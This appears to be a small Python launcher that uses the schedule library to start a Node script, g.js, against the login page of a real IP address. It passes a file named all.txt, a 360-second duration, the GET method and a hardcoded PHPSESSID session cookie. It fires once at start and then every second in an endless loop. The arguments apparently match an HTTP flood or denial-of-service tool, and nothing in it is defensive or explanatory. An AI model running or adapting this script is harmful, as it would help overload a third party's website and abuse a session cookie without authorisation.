import schedule
import time
import os
import sys

os.system('node g.js http://184.168.114.10/LOGIN all.txt 360 GET PHPSESSID:uj1gog4vjak2igf6t8humcseo3')

def job():
    os.system('node g.js http://184.168.114.10/LOGIN all.txt 360 GET PHPSESSID:uj1gog4vjak2igf6t8humcseo3')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)
